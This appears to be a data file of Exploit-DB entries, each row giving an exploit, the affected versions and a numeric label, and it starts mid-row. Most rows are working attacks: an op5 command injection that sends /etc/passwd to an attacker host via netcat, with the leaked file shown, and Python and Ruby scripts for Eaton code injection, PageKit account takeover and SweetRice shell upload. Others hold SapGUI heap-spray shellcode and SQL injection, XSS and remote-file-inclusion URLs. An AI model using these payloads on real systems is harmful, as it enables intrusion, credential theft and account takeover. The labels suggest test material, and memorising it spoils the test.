name=""prompt_cancel_button_text"" value="""" />       <input type=""hidden"" name=""send_welcome_notification"" value=""true"" />       <input type=""hidden"" name=""welcome_notification_title"" value="""" />       <input type=""hidden"" name=""welcome_notification_message"" value="""" />       <input type=""hidden"" name=""welcome_notification_url"" value="""" />       <input type=""hidden"" name=""notification_on_post"" value=""true"" />       <input type=""hidden"" name=""utm_additional_url_params"" value="""" />       <input type=""hidden"" name=""allowed_custom_post_types"" value="""" />       <input type=""hidden"" name=""custom_manifest_url"" value="""" />       <input type=""hidden"" name=""show_notification_send_status_message"" value=""true"" />       <input type=""submit"" value=""Send"" />     </form>   </body> </html>",['1.17.5'],1
39676,"op5 7.1.9 - Remote Command Execution [+] Credits: hyp3rlinx  [+] Website: http://hyp3rlinx.altervista.org  [+] Source: http://hyp3rlinx.altervista.org/advisories/OP5-REMOTE-CMD-EXECUTION.txt   Vendor: ============ www.op5.com   Product: =========== op5 v7.1.9  op5 Monitor is a software product for server, Network monitoring and management based on the open source Project Nagios.   Vulnerability Type: ======================== Remote Command Execution   CVE Reference: ============== N/A   Vulnerability Details: =====================  op5 has a CSRF entry point that can be used to execute arbitrary remote commands on op5 system sent via HTTP GET requests, allowing attackers to completely takeover the affected host, to be victimized a user must be authenticated and visit a malicious webpage or click an infected link...  Reference: https://www.op5.com/blog/news/op5-monitor-7-2-0-release-notes/   Exploit code(s): ===============  trivial RCE cat /etc/passwd... using netcat  nc.exe  -vvlp 5555 > passwds.txt  https://192.168.1.103/monitor/op5/nacoma/command_test.php?cmd_str=/bin/cat%20/etc/passwd%20|%20nc%20192.168.1.102%205555 <https://192.168.1.103/monitor/op5/nacoma/command_test.php?cmd_str=/bin/cat%20/etc/passwd%20%7C%20nc%20192.168.1.102%205555>   result:  listening on [any] 5555 ... 192.168.1.103: inverse host lookup failed: h_errno 11004: NO_DATA connect to [192.168.1.102] from (UNKNOWN) [192.168.1.103] 56935: NO_DAT  sent 0, rcvd 1343  C:\netcat-win32-1.12>type passwds.txt root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin gopher:x:13:30:gopher:/var/gopher:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin abrt:x:173:173::/etc/abrt:/sbin/nologin apache:x:48:48:Apache:/var/www:/sbin/nologin smstools:x:499:499::/var/lib/smstools:/bin/bash postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash op5lsu:x:500:500::/home/op5lsu:/bin/bash saslauth:x:498:76:Saslauthd user:/var/empty/saslauth:/sbin/nologin postfix:x:89:89::/var/spool/postfix:/sbin/nologin haldaemon:x:68:68:HAL daemon:/:/sbin/nologin monitor:x:299:48::/opt/monitor:/bin/bash ntp:x:38:38::/etc/ntp:/sbin/nologin mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin tcpdump:x:72:72::/:/sbin/nologin    Disclosure Timeline: ============================================ Vendor Notification:  March 27, 2016 Vendor confirms vulnerability March 27, 2016 Vendor issue patched new release v7.2.0 April 5, 2016 April 6, 2016  : Public Disclosure   Exploitation Technique: ======================= Remote   Severity Level: ================ High   Description: =================================================================   Request Method(s):        [+] GET   Vulnerable Product:       [+] op5 v7.1.9   Vulnerable Parameter(s):  [+] 'cmd_str'  =================================================================  [+] Disclaimer Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.  hyp3rlinx",['7.1.9'],1
29578,Tagit! Tagit2b 2.1.B Build 2 - 'tagviewer.php' Multiple Remote File Inclusions source: https://www.securityfocus.com/bid/22518/info  TagIt! TagBoard is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.  Exploiting these issues may allow an attacker to compromise the application and the underlying system; other attacks are also possible.  TagBoard 2.1.b Build 2 and prior versions are vulnerable.   http://www.example.com/[TagIt_path]/tagviewer.php?configpath=http://example2.com/evil? http://www.example.com/[TagIt_path]/tagviewer.php?adminpath=http://example2.com/evil?,"['2.1.B Build 2', '2.1.b Build 2', 'prior versions']",1
30059,"Eaton Network Shutdown Module 3.21 - Remote PHP Code Injection #!/usr/bin/env python #  # Quick 'n' Dirty - Metasploit module didn't do it for me # 2013 - Filip Waeytens - http://www.wsec.be # # Usage Example: ##~  $ python eaton.py 192.168.1.9 ""net user"" # #User accounts for \\ # #------------------------------------------------------------------------------- #Guest                    LocalAdmin                #The command completed with one or more errors. # # Exploit Title: Eaton shutdown module php eval exploit # Date: 5 dec2013 # Exploit Author: Filip Waeytens # Vendor Homepage: powerquality.eaton.com # Software Link: http://powerquality.eaton.com/Products-services/Power-Management/Software-Drivers/network-shutdown.asp # Version: 3.21 # Tested on: WIN #References: ###Exploit Database: 23006 ###Secunia Advisory ID: 49103 ###Bugtraq ID: 54161 ###Related OSVDB ID: 83200 83201 ###Packet Storm: http://packetstormsecurity.org/files/118420/Network-Shutdown-Module-3.21-Remote-PHP-Code-Injection.html #  import httplib import urllib import sys import BeautifulSoup  #### First argument is the target IP - port defaults to 4679  targetip = sys.argv[1] command = sys.argv[2] targetport=4679   #### if a command has spaces: put between double quotes, the next lines strip the quotes  if command.startswith('""') and string.endswith('""'):     command = command[1:-1]  #### build the urL to request      baserequest = ""/view_list.php?paneStatusListSortBy="" wrappedcommand=""${@print(system(\""""+command+""\""))}"" ue_command = urllib.quote_plus(wrappedcommand)  #### send request conn = httplib.HTTPConnection(targetip+"":""+str(targetport)) conn.request(""GET"", baserequest+ue_command) r1 = conn.getresponse() #print ""Getting answer: "" #print r1.status, r1.reason #print ""sent http://""+targetip+"":""+str(targetport)+baserequest+ue_command data1 = r1.read()   #### extract answer  soup = BeautifulSoup.BeautifulSoup(data1) for p in soup.findAll(""p""):             #print dir(p)             #strip first line                          result = p.getText().split(""Warning"")[0]             print result.replace(""Multi-source information on the power devices suppying the protected server"","""",1)",['3.21'],1
29110,"Grandora Rialto 1.6 - 'printmain.asp?ID' SQL Injection source: https://www.securityfocus.com/bid/21191/info     Grandora Rialto is prone to multiple input-validation vulnerabilities, including SQL-injection and cross-site scripting issues, because it fails to sufficiently sanitize user-supplied data.     Exploiting this issue could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.     Version 1.6 is vulnerable; other versions may also be affected.  http://www.example.com/printmain.asp?ID='[sql]",['1.6'],1
44612,"Open-AudIT Professional - 2.1.1 - Cross-Site Scripting # Exploit Title: Open-AudIT Professional 2.1.1 – Multiple Cross-Site Scripting  # Exploit Author: Tejesh Kolisetty # Vendor Homepage: https://opmantek.com/ # Software Link: https://opmantek.com/network-tools-download/ # Affected Version: 2.1.1 # Category: WebApps # Tested on: Win7 Professional # CVE : CVE-2018-9155  # 1. Vendor Description: # Network Discovery and Inventory Software | Open-AudIT | Opmantek # Discover what's on your network. Open-AudIT is the world's leading network discovery, inventory and audit program. Used by over 10,000 customers.  # 2. Technical Description: # Cross-site scripting (XSS) vulnerability found in Multiple instances of Open-AudIT Professional - 2.1.1 that allows remote attackers to inject arbitrary web script or HTML, as demonstrated in below POC.  # 3. Proof of Concept: # a) Login as user who is having Attributes Creation role # b) Navigate to Manage -> Attributes -> Create Attributes # c) Now fill the form with XSS payload in ‘Name’ field and submit payload: <script>alert('XSS')</script> # d) Once the data is saved, the script get executed.  # Multiple Instances: Admin -> Logs -> View System Logs Manage -> Attributes -> Create Attributes Manage -> Users -> Create Users  # 4. Solution: # Clone with below Gits: # https://github.com/Opmantek/open-audit/commit/aab685484446126a58a49b994ba5dfae6e92f4db#diff-e6d7b17fe09e809cb98cdf38b7f12638 # https://github.com/Opmantek/open-audit/commit/755a9af8895a9e28fac82d8add7012f77bb9a8d2 # Or Upgrade to latest release Open-AudIT Professional # https://opmantek.com/network-tools-download/",['2.1.1'],1
41143,"PageKit 1.0.10 - Password Reset # Exploit Title: Remote PageKit Password Reset Vulnerability # Date:​21-01-2017 # Software Link: http://pagekit.com/ # Exploit Author: Saurabh Banawar from SecureLayer7​  # Contact: http://twitter.com/​securelayer7 # Website: http​s://securelayer7.net​ # Category: webapps  1. Description  Anyremote user can reset the password by reading the debug log, the exploit can be successfully executed, if the debug option is enabled in the Pagekit CMS.  CMS Pentest report can be found here:https://securelayer7.net/ download/pdf/SecureLayer7-Pentest-report-Pagekit-CMS.pdf   2. Proof of Concept  ​require 'net/http'  #Enter the domain/IP address of the site for which you want to test this vulnerability vulnerableSite = 'http://127.0.0.1'  loopCount = 0 while loopCount == 0   #We request the Login page which has the debug parameter url = URI.parse(vulnerableSite + '/pagekit/index.php/user/login') request = Net::HTTP::Get.new(url.to_s) resp = Net::HTTP.start(url.host, url.port) {|http| http.request(request) }  #The response is received and is sent to many regular expression to find the value of _debug parameter from its HTML source code bodyOfResponse =  resp.body myArray1 = bodyOfResponse.split(/""current"":""/) outputOfMyArray1 = myArray1[1] myArray2 = outputOfMyArray1.split(/""};/) theSecret = myArray2[0] puts """" puts ""The secret token to debug link is: #{theSecret}"" puts """" url = URI.parse(vulnerableSite + '/pagekit/index.php/_debugbar/' + theSecret) request = Net::HTTP::Get.new(url.to_s) resp = Net::HTTP.start(url.host, url.port) {|http| http.request(request) }  resp.body  initial = resp.body  #The count of number of victim users is found out  users = initial.scan(/user=.+?(?="")/)  c =  users.count  e = c.to_i   #If the count is 0 then we continuosly monitor it  if c == 0 then puts ""Currently no user has clicked on reset password like.""    puts """"  puts ""Trying again...""  puts """"  puts """"   #If the count is greater than 0 then it means we found a victim. So, find the password reset link and display it in the console  else    link1 = vulnerableSite + ""/pagekit/index.php/user/resetpassword/confirm?user=""  link2 = ""&key=""  i = 0   while i<e 	securityToken = ''     a = real[i] 	b = a.split('=') 	c = b[1] 	d = c.split('\\') 	victimUserName = d[0] 	puts ""The victim is: #{victimUserName}"" 	f = b[2] 	securityToken = f.scan(/[^\\]/) 	securityTokenFiltered = securityToken.join 	puts ""The security token of victim is: #{securityTokenFiltered}"" 	puts ""Link for account takeover"" 	puts ""#{link1}#{victimUserName}#{link2}#{securityTokenFiltered}"" 	puts """" 	puts """" 	i += 1  end      end    # This loop runs forever because we want to continuosly monitor who is requesting a password reset and who has clicked on the link so that  # we can perform mass account takeovers  end      3. Solution:  Update to version 1.0.11 https://github.com/pagekit/pagekit/releases/tag/1.0.11",['1.0.10'],1
8922,"Worldweaver DX Studio Player < 3.0.29.1 Firefox plugin - Command Injection -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1        Core Security Technologies - CoreLabs Advisory            http://www.coresecurity.com/corelabs/      DX Studio Player Firefox plug-in command injection    1. *Advisory Information*  Title: DX Studio Player Firefox plug-in command injection Advisory ID: CORE-2009-0521 Advisory URL: http://www.coresecurity.com/content/DXStudio-player-firefox-plugin Date published: 2009-06-09 Date of last update: 2009-06-09 Vendors contacted: Worldweaver Release mode: Coordinated release   2. *Vulnerability Information*  Class: Command injection Remotely Exploitable: Yes Locally Exploitable: No Bugtraq ID: N/A CVE Name: CVE-2009-2011   3. *Vulnerability Description*  DX Studio [1] is a complete integrated development environment for creating interactive 3D graphics. DX Studio Player plug-in for Firefox [2] is vulnerable to a remote command execution vulnerability.   4. *Vulnerable packages*     . DX Studio Player v3.0.29.0    . DX Studio Player v3.0.22.0    . DX Studio Player v3.0.12.0    . Older versions are probably affected too, but they were not checked.   5. *Non-vulnerable packages*     . DX Studio Player v3.0.29.1   6. *Vendor Information, Solutions and Workarounds*  On June 1st DXStudio team patched the current release 3.0.29 to 3.0.29.1 for all new downloads to fix the problem with the Firefox plugin, and also posted a sticky announce for all its users [3].   7. *Credits*  This vulnerability was discovered and researched by Diego Juarez from Core Security Technologies.   8. *Technical Description / Proof of Concept Code*  DX Studio is a complete integrated development environment for creating interactive 3D graphics. DX Studio provides a javascript API in which the method 'shell.execute()' is defined as follows:  /-----------  Prototype: shell.execute(commandString, [paramString], [commandIsProgId]);  - -----------/  This method sends the 'commandString' to the Windows shell with optional parameters in 'paramString'. For security reasons, this function is not available when running in a web browser. If you set 'commandIsProgId' to true, you can launch a utility by its 'ProgID', e.g. 'WMP.DVD' with parameter 'play' would play a DVD in Windows Media Player.  In our tests, despite what is stated in the documentation, we found that the function is actually available to both the Internet Explorer and Firefox browser plug-ins. In the IE plug-in the user does get a warning about the security implications of allowing such '.dxstudio' file to run. On Firefox however, there is no such warning whatsoever, allowing an attacker to execute arbitrary code on the client side by luring the victim into clicking a link or visiting a malicious website.   8.1. *Proof of Concept (header.xml)*  /-----------  <?xml version=""1.0"" encoding=""utf-8"" standalone=""yes""?> <dxstudio version=""1.0.0"" width=""800"" height=""600"" defaultscriptlanguage=""javascript"">   <display frame=""yes"" hidecursor=""no"" hideconsole=""no"" hidecontext=""no"" maxfps=""100"" unthrottled=""no"" priority=""normal"" syncrefresh=""yes"" changeresolution=""no"" userresize=""yes"" workarea=""no"" windowmask=""no"" src="""" minplayerversion=""1.0.0"">     <loading console=""yes"" custom=""no"" custombackground=""no"" customlogo=""yes"" showversion=""no"">       <prop id=""background"" type=""color"" r=""0"" g=""0"" b=""0"" a=""1"" />       <logo src="""" />       <customprogress />     </loading>   </display>   <script>     <![CDATA[function onInit() { shell.execute(""cmd.exe"",""/k cls|@echo this is wrong, very wrong."") } ] ]>   </script>   <licenseinfo stamp=""cgdaaaaa"" />   <security>     <prop id=""password"" type=""string"" value="""" />     <prop id=""allowplayer"" type=""bool"" state=""no"" />     <prop id=""nocache"" type=""bool"" state=""yes"" />   </security> </dxstudio>  - -----------/  Note: The security vulnerability is also exploitable on the standalone player, however, this functionality appears to be the expected behavior and fully intended for the standalone player.   9. *Report Timeline*  . 2009-05-21: Core Security Technologies notifies the Worldweaver Support Team (WST) of the vulnerability and announces its initial plan to publish the content on June 15th, 2009.  . 2009-05-26: The WST asks Core for a technical description of the vulnerability.  . 2009-05-26: Technical details sent to WST by Core.  . 2009-06-08: Core asks WST for an estimated date to fix this issue.  . 2009-06-08: WST notifies Core that a fix has already been produced and it is available to the users.  . 2009-06-09: The advisory CORE-2009-0521 is published.   10. *References*  [1] http://www.dxstudio.com. [2] http://www.dxstudio.com/download2.aspx. [3] http://www.dxstudio.com/forumtopic.aspx?topicid=b4152459-fb5f-4933-b700-b3fbd54f6bfd   11. *About CoreLabs*  CoreLabs, the research center of Core Security Technologies, is charged with anticipating the future needs and requirements for information security technologies. We conduct our research in several important areas of computer security including system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for public use at: http://www.coresecurity.com/corelabs.   12. *About Core Security Technologies*  Core Security Technologies develops strategic solutions that help security-conscious organizations worldwide develop and maintain a proactive process for securing their networks. The company's flagship product, CORE IMPACT, is the most comprehensive product for performing enterprise security assurance testing. CORE IMPACT evaluates network, endpoint and end-user vulnerabilities and identifies what resources are exposed. It enables organizations to determine if current security investments are detecting and preventing attacks. Core Security Technologies augments its leading technology solution with world-class security consulting services, including penetration testing and software security auditing. Based in Boston, MA and Buenos Aires, Argentina, Core Security Technologies can be reached at 617-399-6980 or on the Web at http://www.coresecurity.com.   13. *Disclaimer*  The contents of this advisory are copyright (c) 2009 Core Security Technologies and (c) 2009 CoreLabs, and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.   14. *PGP/GPG Keys*  This advisory has been signed with the GPG key of Core Security Technologies advisories team, which is available for download at http://www.coresecurity.com/files/attachments/core_security_advisories.asc. -----BEGIN PGP SIGNATURE----- Version: GnuPG v1.4.7 (MingW32) Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org  iD8DBQFKLtHJyNibggitWa0RAlq1AJ0cZPpDqReJWHd0toN7tnTFLVA99gCgiG/Q PMPteYbShbRU4j4tIk93HPM= =Mx5G -----END PGP SIGNATURE-----  # milw0rm.com [2009-06-10]",['3.0.29.1 Firefox plugin'],0
2398,"Digital WebShop 1.128 - Multiple Remote File Inclusions # Title  :  Digital WebShop = v1.128 Multiple Remote File Include Vulnerabilities # Author :   ajann # Script Page : http://digitalwebshop.dyndns.org  # Exploit; ******************************************************************************* [Files] rechnung.php prepend.php [/Files]  [Code,1] prepend.php Error:  // include Werzeuge .. .... require_once($_PHPLIB[""libdir""] . ""phpDB-mysql.lib"");                   /* Mysql Class*/ require_once($_PHPLIB[""libdir""] . ""messages_inc.php"");                  /* Layout f?r Echos & Prints. */ .... ..  Key [:] _PHPLIB[libdir]=http://target.com/command.php?  \Example:  http://target.com/rechnung.php?_PHPLIB[libdir]=http://target.com/command.php?  # ajann,Turkey # ... # Im not Hacker!  # milw0rm.com [2006-09-19]","['1.128', 'v1.128']",0
33162,"PHP 5.2.10/5.3 - 'ini_restore()' Memory Information Disclosure (1) source: https://www.securityfocus.com/bid/36009/info  PHP is prone to an information-disclosure vulnerability.  Attackers can exploit this issue to obtain sensitive information that may lead to further attacks.   <?php  ini_set(""session.save_path"", ""0123456789ABCDEF""); ini_restore(""session.save_path""); session_start(); ?>",['5.2.10/5.3'],1
29826,"Linux Kernel 2.6.x - AppleTalk ATalk_Sum_SKB Function Denial of Service source: https://www.securityfocus.com/bid/23376/info  The Linux kernel is prone to a denial-of-service vulnerability. This issue presents itself when malformed AppleTalk frames are processed.  An attacker can exploit this issue to crash host computers, effectively denying service to legitimate users.  Versions prior to 2.6.20.5 are vulnerable.   { # Ethernet header -----  XX XX XX XX XX XX # Destination MAC 00 00 00 00 00 00 # Source MAC 00 1D # Length  # LLC header -----  AA AA 03 08 00 07 80 9B # Appletalk  # Appletalk header -----  00 1B # Packet length (invalid) 00 01 # Fake checksum 00 00 00 00 # Destination and source networks 00 00 00 00 # Destination and source nodes and ports  # Payload -----  0C 0D 0E 0F 10 11 12 13 14 }","['2.6.x', 'to 2.6.20.5']",1
27685,IntelliLink Pro 5.06 - 'addlink_lwp.cgi?url' Cross-Site Scripting source: https://www.securityfocus.com/bid/17605/info  IntelliLink Pro is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.   An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/addlink_lwp.cgi?url=[XSS],['5.06'],1
23582,"Acme thttpd 1.9/2.0.x - CGI Test Script Cross-Site Scripting source: https://www.securityfocus.com/bid/9474/info  thttpd is prone to a cross-site scripting vulnerability in the CGI test script. This could permit a remote attacker to create a malicious link to the web server that includes hostile HTML and script code. If this link were followed, the hostile code may be rendered in the web browser of the victim user. This would occur in the security context of the web server and may allow for theft of cookie-based authentication credentials or other attacks.  It should be noted that FREESCO includes an embedded version of thttpd and is also prone to this vulnerability.   http://www.example.com/cgi/example?test=<script>alert('xss')</script>",['1.9/2.0.x'],1
14416,"SapGUI BI 7100.1.400.8 - Heap Corruption <!--   Product: SapGUI BI File: c:\program files\sap\business explorer\bi\wadmxhtml.dl Version: 7100.1.400.8 ClassID: 30DD068D-5AD9-434C-AAAC-46ABE37194EB RegKey Safe for Script: False RegKey Safe for Init: False Implements IObjectSafety: True IDisp Safe:  Safe for untrusted: caller,data   IPersist Safe:  Safe for untrusted: caller,data   KillBitSet: False  Vulnerable Property: Tags --> <html>  <head>   <title></title>   <script language=""JavaScript"" defer>      var buf = '';     while (buf.length < 64) buf += unescape(""%u0a05"");       function Check() { 	 	// windows/exec - 557 bytes 	// http://www.metasploit.com 	// Encoder: x86/alpha_mixed 	// EXITFUNC=process, CMD=c:\\windows\\system32\\calc.exe 	var shellcode = unescape(""%uc2dd%uc92b%u38b1%u4fba%uc033%ud9a3%u2474%u5ef4%u5631%u031a%u1a56%uc683%ue204%ucfba%u2a28%u3044%u4da9%ud5cd%u5f98%u9ea9%u6f89%uf3ba%u1b21%ue7ee%u69b2%u0726%uc772%u2610%ue983%ue49c%u6b47%uf760%u4b9b%u3859%u8aee%u259e%ude01%u2177%ucfb0%u77fc%uf109%uf3d2%u8931%uc357%u23c6%u1456%u3f76%u8c10%u67fc%uad80%u7bd1%ue4fc%u4f5e%uf777%u81b6%uc978%u4ef6%ue547%u8ffa%uc280%ue5e4%u30fa%ufd98%u4a39%u8b46%uecdf%u2b0d%u0c3b%uaac1%u02c8%ub9ae%u0696%u6d31%u33ad%u90ba%ub261%ub6f8%u9ea5%ud65b%u7afc%ue70d%u221e%u4df2%uc155%uf4e7%u8c34%u75f6%ue943%u85f9%u5a4b%ub492%u35c0%u48e5%u7203%u0319%ud309%ucab2%u61d8%uecdf%ua537%u6ee6%u56bd%u6e1d%u53b4%u2859%u2e25%uddf2%u9d49%uf7f3%u1b2a%ua450%u32db%u3006%ub24c%ue4a5%u4fce%u6633%uca9a%ubbae%u4950%udf6d%u1df5%u31ee%ua590%u4d95""); 	 	 	var bigblock = unescape(""%u0c0c""); 	var headersize = 20; 	var slackspace = headersize + shellcode.length; 	while (bigblock.length < slackspace) bigblock += bigblock; 	var fillblock = bigblock.substring(0,slackspace); 	var block = bigblock.substring(0,bigblock.length - slackspace); 	while (block.length + slackspace < 0x40000) block = block + block + fillblock;  	 	var memory = new Array(); 	for (i = 0; i < 550; i++){ memory[i] = block + shellcode; } 			 	var jmpblock = buf.substring(0, 32);  	var a = new Array(); 	 	for (i = 0; i < 512; i++) { 		obj.Tags = jmpblock.substring(0, jmpblock.length); 		a[i] = obj.Tags.substring(0, obj.Tags.length); 		obj.Tags = ''; 		a[i] += jmpblock; 	}	  }       </script>   </head>   <body onload=""JavaScript: return Check();""> <object id=""obj"" classid=""clsid:30DD068D-5AD9-434c-AAAC-46ABE37194EB""> 		Unable to create object 	</object>     </body> </html>",['7100.1.400.8'],1
29999,Campsite 2.6.1 - 'UserType.php?g_documentRoot' Remote File Inclusion source: https://www.securityfocus.com/bid/23874/info                                   Campsite is prone to multiple remote file-include vulnerabilities.                                   Exploiting this issue allows remote attackers to execute code in the context of the webserver.                                   This issue affects Campsite 2.6.1. Earlier versions may also be affected.  http://www.example.com/classes/UserType.php?g_DocumentRoot=shell.txt?,['2.6.1'],1
10180,"Simplog 0.9.3.2 - Multiple Vulnerabilities ################################################################################ Mutliple Vulnerabilities in Simplog v0.9.3.2  Name Multiple vulnerabilities in Simplog Systems Affected Simplog 0.9.3.2 and possibly earlier versions Download http://sourceforge.net/projects/simplog/files/simplog/0.9.3.2/simplog-0.9.3.2.tar.gz/download Author Amol Naik (amolnaik4[at]gmail.com) Date 16/11/2009 ################################################################################   ############ 1. OVERVIEW ############  Simplog provides an easy way for users to add blogging capabilities to their existing websites. Simplog is written in PHP and compatible with multiple databases. Simplog also features an RSS/Atom aggregator/reader.  ############### 2. DESCRIPTION ###############  Simplog is vulnerable to Persistent cross-site scripting, cross-site request forgery and unauthorized comment deletion.  ###################### 3. TECHNICAL DETAILS ######################  Summery:  (A) Persistent Cross-site Scripting (B) Cross Site Request Forgery (C) Edit/Delete Comments (Bypassing Authorization)   (A) Persistent Cross-site Scripting ++++++++++++++++++++++++++++++++++++  Vulnerable page comments.php Vulnerable Parameters cname, email  When adding a comment for any blog entry, it is possible to add a Persistent XSS payload in ""Name"" & ""Email"" parameters due to improper sanitization of the user inputs.  ++++ POC ++++  Put this in the comment:  Name: alert(""AMol_NAik"") email:"">alert(""AMol_NAik"")   (B) Cross Site Request Forgery +++++++++++++++++++++++++++++++  Vulnerable Page user.php  This application is vulenrable to CSRF which changes the password of an authenticated user. This is applicable to Admin as well.  ++++ POC ++++  http://server/simplog/user.php?pass1=&pass2=&blogid=&act=change   For example, if an authenticated user clicks on the below link, his/her password changes to ""AMol_NAik"".  http://server/simplog/user.php?pass1=AMol_NAik&pass2=AMol_NAik&blogid=1&act=change   (C) Edit/Delete Comments (Bypassing Authorization) +++++++++++++++++++++++++++++++++++++++++++++++++++  Vulnerable Page comments.php Vulnerable Parameters op, cid  The application provides a function to edit n delete the comments to Blog Admin. It is possible for attacker to edit/delete any comment due to improper authorization.  ++++ POC ++++  Edit comment: http://server/simplog/comments.php?op=edit&cid= Delete Comment: http://server/simplog/comments.php?op=del&cid=   ############ 4. TimeLine ############  03/11/2009 Bug Discovered 03/11/2009 Reported to Vendor 16/11/2009 No response received till the date 16/11/2009 Public Disclosure","['0.9.3.2', 'earlier versions']",1
25596,"ASP Inline Corporate Calendar 3.6.3 - 'Details.asp' SQL Injection source: https://www.securityfocus.com/bid/13487/info  ASP Inline Corporate Calendar is prone to an SQL injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.  Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.   http://www.example.com/Calendar/details.asp?Event_ID='",['3.6.3'],1
38425,"PHP Address Book - '/addressbook/register/delete_user.php?id' SQL Injection source: https://www.securityfocus.com/bid/58911/info  PHP Address Book is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied input.  A successful exploit may allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  PHP Address Book 8.2.5 is vulnerable; other versions may also be affected.   http://www.example.com/addressbook/register/delete_user.php?id={insert}",['8.2.5'],1
4472,"actSite 1.56 - 'news.php' Local File Inclusion                          \#'#/                           (-.-)     -----------------oOO---(_)---OOo-----------------     | actSite v1.56 (news.php) Local File Inclusion |     |                 coded by DNX                  |     -------------------------------------------------  [!] Discovered: DNX  [!] Vendor: http://www.actsite.de  [!] Detected: 02.09.2007  [!] Reported: 02.09.2007  [!] Remote: yes    [!] Background: actSite is a content management system based on PHP and MySQL    [!] Bug: in phpinc/news.php line 101             require PHP_INCLUDE_PATH.""/inc/news/news_$_POST[do].php"";    [!] PoC:       - http://[site]/[path]/phpinc/news.php?do=/../../../../../../../etc/passwd%00    [!] Description:      - So why we can inject code in a post variable per url? Let's do some research...        - In phpinc/news.php line 36        	require_once('../config.php');          - Let's take a look in 'config.php' line 22          if(empty($BaseCfg['install_run'])) require_once($BaseCfg['BaseDir'].""/phpinc/inc/csb.php"");          - Ok, let's take a look in 'phpinc/inc/csb.php' line 18          if(getenv('REQUEST_METHOD') == ""GET"") {  		foreach($_GET as $key => $val) {  			 $_POST[$key] =& $_GET[$key];  		}  	}    [!] Solution: Install security update to v1.57  # milw0rm.com [2007-10-01]",['1.56'],1
40716,"SweetRice 1.5.1 - Arbitrary File Upload #/usr/bin/python #-*- Coding: utf-8 -*- # Exploit Title: SweetRice 1.5.1 - Unrestricted File Upload # Exploit Author: Ashiyane Digital Security Team # Date: 03-11-2016 # Vendor: http://www.basic-cms.org/ # Software Link: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip # Version: 1.5.1 # Platform: WebApp - PHP - Mysql  import requests import os from requests import session  if os.name == 'nt':     os.system('cls') else:     os.system('clear')     pass banner = ''' +-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+ |  _________                      __ __________.__                  | | /   _____/_  _  __ ____   _____/  |\______   \__| ____  ____      | | \_____  \\ \/ \/ // __ \_/ __ \   __\       _/  |/ ___\/ __ \     | | /        \\     /\  ___/\  ___/|  | |    |   \  \  \__\  ___/     | |/_______  / \/\_/  \___  >\___  >__| |____|_  /__|\___  >___  >    | |        \/             \/     \/            \/        \/    \/     |                                                     |    > SweetRice 1.5.1 Unrestricted File Upload                     | |    > Script Cod3r : Ehsan Hosseini                                | +-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+ '''  print(banner)   # Get Host & User & Pass & filename host = input(""Enter The Target URL(Example : localhost.com) : "") username = input(""Enter Username : "") password = input(""Enter Password : "") filename = input(""Enter FileName (Example:.htaccess,shell.php5,index.html) : "") file = {'upload[]': open(filename, 'rb')}  payload = {     'user':username,     'passwd':password,     'rememberMe':'' }    with session() as r:     login = r.post('http://' + host + '/as/?type=signin', data=payload)     success = 'Login success'     if login.status_code == 200:         print(""[+] Sending User&Pass..."")         if login.text.find(success) > 1:             print(""[+] Login Succssfully..."")         else:             print(""[-] User or Pass is incorrent..."")             print(""Good Bye..."")             exit()             pass         pass     uploadfile = r.post('http://' + host + '/as/?type=media_center&mode=upload', files=file)     if uploadfile.status_code == 200:         print(""[+] File Uploaded..."")         print(""[+] URL : http://"" + host + ""/attachment/"" + filename)         pass",['1.5.1'],1
